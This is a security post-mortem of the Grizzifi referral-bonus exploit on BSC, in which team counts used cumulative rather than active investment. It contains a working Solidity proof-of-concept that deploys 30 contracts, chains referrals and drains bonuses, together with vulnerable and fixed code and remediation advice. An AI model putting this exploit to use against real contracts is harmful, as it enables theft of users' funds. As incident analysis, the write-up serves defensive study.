# Grizzifi — Bonus Drain via Team Count Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-08-13 |
| **Protocol** | Grizzifi |
| **Chain** | BSC |
| **Loss** | ~61,000 USD |
| **Attacker** | [0xe2336b08a43f87a4ac8de7707ab7333ba4dbaf7c](https://bscscan.com/address/0xe2336b08a43f87a4ac8de7707ab7333ba4dbaf7c) |
| **Attack Tx** | [0x36438165](https://bscscan.com/tx/0x36438165d701c883fd9a03631ee0cdeec35a138153720006ab59264db7e075c1) |
| **Vulnerable Contract** | [0x21ab8943380b752306abf4d49c203b011a89266b](https://bscscan.com/address/0x21ab8943380b752306abf4d49c203b011a89266b) |
| **Root Cause** | `_incrementUplineTeamCount()` calculates team count using cumulative investment (including withdrawals) instead of active investment |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/Grizzifi_exp.sol) |

---

## 1. Vulnerability Overview

The Grizzifi investment protocol distributes milestone bonuses and referral bonuses based on the investment volume of an upline (referrer) team. The `_incrementUplineTeamCount()` function responsible for calculating team size uses `totalInvested` (cumulative amount including withdrawn funds) instead of the current active investment. By deploying 30 attack contracts, each repeatedly depositing a small amount and immediately withdrawing, the attacker artificially inflated the team count to claim bonuses.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable logic: team count calculated using cumulative investment (including withdrawals)
function _incrementUplineTeamCount(address referrer, uint256 amount) internal {
    address upline = referrer;
    for (uint256 i = 0; i < 10; i++) {
        if (upline == address(0)) break;
        // ❌ totalInvested does not decrease after withdrawal
        if (userInfo[upline].totalInvested >= MILESTONE_THRESHOLD) {
            // Milestone reached, pay bonus
            _payMilestoneBonus(upline);
        }
        upline = userInfo[upline].referrer;
    }
}

// ✅ Fix: calculate using active investment (activeInvestment)
function _incrementUplineTeamCount(address referrer, uint256 amount) internal {
    address upline = referrer;
    for (uint256 i = 0; i < 10; i++) {
        if (upline == address(0)) break;
        // ✅ activeInvestment = totalInvested - totalWithdrawn
        if (userInfo[upline].activeInvestment >= MILESTONE_THRESHOLD) {
            _payMilestoneBonus(upline);
        }
        upline = userInfo[upline].referrer;
    }
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Grizzifi_decompiled.sol
contract Grizzifi {
    function getDownlineCountAtLevel(address a, uint256 b) external view returns (uint256) {  // ❌ Vulnerability
        // TODO: decompiled logic not implemented
    }


    // This function is part of the exploit path: `_incrementUplineTeamCount()` calculates team count using cumulative investment (including withdrawals) instead of active investment
    function rewardAmounts(uint256 a) external returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x8e1e2a06
    function referralRates(uint256 a) external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x200f3061
    function getCompleteNetworkStats(address a) external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xa6bd72b4
    function collectRefBonus() external {
        // TODO: decompiled logic not implemented
    }

```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Deploy 30 AttackContract1s (each holding 20 BSC-USD)
  │
  ├─2─▶ Build chain structure (ac[0] referrer=0, ac[1] referrer=ac[0], ...)
  │         └─ Form 30-level upline chain
  │
  ├─3─▶ Execute each ac.init(GRIZZIFI, prevAC) in order:
  │         ├─ harvestHoney(planId=0, amount=10 BSC-USD, referrer=prevAC)
  │         └─ AttackContract2.run() → re-execute harvestHoney(10 BSC-USD)
  │         └─ totalInvested += 20 BSC-USD (persists even after withdrawal)
  │
  ├─4─▶ _incrementUplineTeamCount repeatedly triggered → milestones reached
  │         └─ Referral bonuses + milestone bonuses accumulate
  │
  └─5─▶ ac.withdraw(GRIZZIFI) × 30 → collectRefBonus() executed
         └─ Claim ~61,000 USD worth of BSC-USD bonuses
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract Grizzifi is BaseTestWithBalanceLog {
    address[] public attackContracts = new address[](30);

    function testExploit() public balanceLog {
        // Step 1: Deploy 30 attack contracts, fund each with 20 BSC-USD
        for (uint256 i = 0; i < 30; i++) {
            AttackContract1 ac1 = new AttackContract1();
            attackContracts[i] = address(ac1);
            IERC20(BSC_USD).transfer(address(ac1), 20 ether);
        }

        // Step 2: Execute harvestHoney in chain structure
        // Inflate totalInvested to reach team count milestones
        address regCenter = address(0);
        for (uint256 i = 0; i < 30; i++) {
            address ac1 = attackContracts[i];
            AttackContract1(ac1).init(GRIZZIFI, regCenter);
            regCenter = ac1;
        }

        // Step 3: Collect referral bonuses from each attack contract
        for (uint256 i = 0; i < 30; i++) {
            try AttackContract1(attackContracts[i]).withdraw(GRIZZIFI) {} catch {}
        }
    }
}

contract AttackContract1 {
    function init(address owner, address regCenter) public {
        IERC20 bscUsd = IERC20(BSC_USD);
        IGrizzifi grizzifi = IGrizzifi(owner);

        bscUsd.approve(owner, type(uint256).max);
        // Deposit 10 BSC-USD (totalInvested +10)
        grizzifi.harvestHoney(0, 10 ether, regCenter);

        // Sub-contract also deposits 10 BSC-USD (further increases team count)
        AttackContract2 ac2 = new AttackContract2();
        bscUsd.transfer(address(ac2), 10 ether);
        ac2.run(BSC_USD, owner, regCenter);
        // totalInvested = 20, but active balance is 0 after withdrawal
    }

    function withdraw(address token) public {
        IGrizzifi(token).collectRefBonus(); // Collect accumulated bonuses
        IERC20 bscUsd = IERC20(BSC_USD);
        bscUsd.transfer(msg.sender, bscUsd.balanceOf(address(this)));
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Cumulative investment misuse (_incrementUplineTeamCount uses totalInvested, which does not decrease after withdrawal, as the team count baseline) |
| **Attack Vector** | Team count manipulation via cumulative investment + multiple contracts |
| **Impact Scope** | Entire bonus pool (~61,000 USD) |
| **CWE** | CWE-682 (Incorrect Calculation) |
| **DASP** | Business Logic |

## 6. Remediation Recommendations

1. **Calculate based on active balance**: Compute team count/milestones using `totalInvested - totalWithdrawn` (net active investment)
2. **Fix snapshot timing**: Verify milestone eligibility via snapshots taken after a set period
3. **Restrict contract addresses as referrers**: Prohibit contract address registration as referrer (check `tx.origin == msg.sender`)
4. **Sybil defense**: Detect patterns where the same EOA repeatedly deposits through multiple contracts

## 7. Lessons Learned

- "Cumulative investment" and "current active investment" are different — failing to distinguish between them creates a vulnerability where milestones persist even after withdrawal.
- Multi-level referral reward structures (MLM-like) are particularly vulnerable to Sybil attacks. If contracts can register as referrers, the attack scale can be fully automated.
- When bonus rewards far exceed the cost of deploying 30 contracts (gas fees), the attack becomes economically rational.